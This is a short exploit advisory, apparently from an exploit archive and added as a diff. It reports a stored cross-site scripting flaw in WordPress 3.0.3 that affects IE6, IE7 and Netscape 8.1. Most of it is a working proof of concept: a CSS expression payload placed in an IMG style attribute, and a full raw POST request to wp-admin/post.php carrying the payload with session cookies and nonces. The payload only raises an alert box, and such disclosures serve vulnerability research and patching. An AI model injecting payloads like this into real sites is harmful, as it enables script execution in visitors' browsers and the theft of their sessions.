@@ -1,0 +1,50 @@
+# Exploit Title: Wordpress 3.0.3 stored XSS IE7,6 NS8.1
+# Date: 27 december 2010
+# Author: Saif
+# Software Link:wordpress.org
+# Version: 3.0.3
+# Tested on: IE 6
+
+a stored XSS vulnerability using CSS styles affecting users surfing the
+malicious post using IE6, IE7, NS 8.1
+
+POC:
+
+"<IMG STYLE="xss:expression(alert('XSS'))">" in the content variable in the
+message body of the post request. Users can perform this attack using a web
+browser
+
+POST /wordpress/wp-admin/post.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
+Gecko/2009102814 Ubuntu/8.10 (intrepid) Firefox/3.0.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer:
+http://127.0.0.1/wordpress/wp-admin/post.php?post=145&action=edit&message=1
+Cookie:
+wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=xss%7C1293636697%7C17562b2ebe444d17730a2bbee6ceba99;
+wp-settings-time-1=1293196695; wp-settings-time-2=1293197912;
+wp-settings-1=m3%3Dc%26editor%3Dhtml; wp-settings-2=editor%3Dhtml%26m5%3Do;
+wp-settings-time-3=1293462654; wp-settings-3=editor%3Dhtml;
+wordpress_test_cookie=WP+Cookie+check;
+wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=xss%7C1293636697%7C7437e30b3242f455911b2b60daf35e48;
+PHPSESSID=a1e7d9fcce3d072b31162c4acbbf1c37;
+kaibb4443=80bdb2bb6b0274393cdd1e47a67eabbd;
+AEFCookies2525[aefsid]=kmxp4rfme1af9edeqlsvtfatf4rvu9aq
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1655
+
+_wpnonce=aad1243dc1&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D145%26action%3Dedit%26message%3D1&user_ID=3&action=editpost&originalaction=editpost&post_author=3&post_type=post&original_post_status=publish&referredby=http%3A%2F%2F127.0.0.1%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D145%26action%3Dedit%26message%3D1&_wp_original_http_referer=http%3A%2F%2F127.0.0.1%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D145%26action%3Dedit%26message%3D1&post_ID=145&autosavenonce=e35a537141&meta-box-order-nonce=718e35f130&closedpostboxesnonce=0203f58029&wp-preview=&hidden_post_status=publish&post_status=publish&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=12&jj=27&aa=2010&hh=15&mn=31&ss=55&hidden_mm=12&cur_mm=12&hidden_jj=27&cur_jj=27&hidden_aa=2010&cur_aa=2010&hidden_hh=15&cur_hh=16&hidden_mn=31&cur_mn=02&original_publish=Update&save=Update&post_category%5B%5D=0&post_category%5B%5D=1&tax_input%5Bpost_tag%5D=&newtag%5Bpost_tag%5D=&post_title=&samplepermalinknonce=ffcbf222eb&content=%3CIMG+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E&excerpt=&trackback_url=&meta%5B108%5D%5Bkey%5D=_edit_last&_ajax_nonce=257f6f6ad9&meta%5B108%5D%5Bvalue%5D=3&meta%5B111%5D%5Bkey%5D=_edit_lock&_ajax_nonce=257f6f6ad9&meta%5B111%5D%5Bvalue%5D=1293465765&meta%5B116%5D%5Bkey%5D=_encloseme&_ajax_nonce=257f6f6ad9&meta%5B116%5D%5Bvalue%5D=1&meta%5B110%5D%5Bkey%5D=_wp_old_slug&_ajax_nonce=257f6f6ad9&meta%5B110%5D%5Bvalue%5D=&metakeyselect=%23NONE%23&metakeyinput=&metavalue=&_ajax_nonce-add-meta=61de41e725&advanced_view=1&comment_status=open&ping_status=open&add_comment_nonce=c32341570f&post_name=145
+
+
+
+Regards,
+
+Saif
+
+OSCP
